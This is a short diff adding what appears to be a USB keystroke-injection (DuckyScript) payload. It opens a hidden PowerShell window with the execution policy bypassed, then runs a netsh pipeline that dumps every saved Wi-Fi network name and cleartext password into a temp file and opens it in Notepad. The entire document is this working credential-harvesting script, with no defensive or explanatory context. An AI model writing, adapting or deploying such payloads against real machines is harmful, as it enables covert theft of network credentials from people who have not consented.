@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+STRING netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() } | ForEach-Object { netsh wlan show profile name="$_" key=clear | Select-String "Key Content|SSID" } | Out-File -FilePath "$env:TEMP\wifi.txt" -Encoding ASCII; notepad "$env:TEMP\wifi.txt"
+ENTER
